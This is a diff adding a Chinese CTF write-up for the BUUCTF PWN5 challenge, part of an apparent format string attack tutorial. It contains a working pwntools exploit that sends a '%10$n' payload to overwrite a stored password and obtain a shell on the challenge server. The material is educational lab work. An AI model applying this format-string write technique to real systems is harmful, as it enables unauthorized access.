@@ -1314,3 +1314,51 @@ if __name__ == "__main__":
 
 （tips：如果判断 x==5，就将 payload 改为 p32(x_addr) + b"A%11$n"）
 
+#### 例题 2：[第五空间2019 决赛]PWN5
+
+[BUU CTF 题目链接](https://buuoj.cn/challenges#[%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019%20%E5%86%B3%E8%B5%9B]PWN5)
+
+和上道题很像，只是伪代码更复杂了一点点。
+
+安全检查：
+
+<img width="311" height="117" alt="853cd3a6a9f1085a1184b16ec2071df3" src="https://github.com/user-attachments/assets/d0d30675-bb4a-4af6-9909-a060c1bf5fe1" />
+
+伪代码：
+
+<img width="1280" height="526" alt="123e878ad745095d5b77f6ecf252d1d2" src="https://github.com/user-attachments/assets/14f4c410-d6f4-443f-93ba-9b587e0e31fa" />
+
+要点其实是随机生成一个密码存到 `buf_` 里面，然后再等你输入密码存到 `nptr` 里面，两个相等就 shell。
+
+然后里面有一个 `printf(buf);` 显然是格式化字符串攻击，修改 buf_值。
+
+<img width="1280" height="527" alt="image" src="https://github.com/user-attachments/assets/4cd4bd3e-d81e-435e-9bbf-d4ad40fd3134" />
+
+得到 `buf_` 地址 `0x804C044`。
+
+<img width="406" height="68" alt="f80dc88844da732b02f4c731b4158d1e" src="https://github.com/user-attachments/assets/31e08b04-277a-4c74-b295-bab2086f1d38" />
+
+得到 offset = 10.
+
+```
+# written by Sonnety
+from pwn import *
+context.arch = "i386"
+
+host = "node5.buuoj.cn"
+port = 29968
+buf_addr = 0x804C044
+
+def main():
+    io = remote(host,port)
+    io.recvuntil("your name:")
+    payload = p32(buf_addr)+b"%10$n"    # offset = 10
+    io.sendline(payload)
+    io.recvline()
+    io.recvuntil("your passwd:")
+    io.sendline(b"4")
+    io.interactive()
+
+if __name__ == "__main__":
+    main()
+```
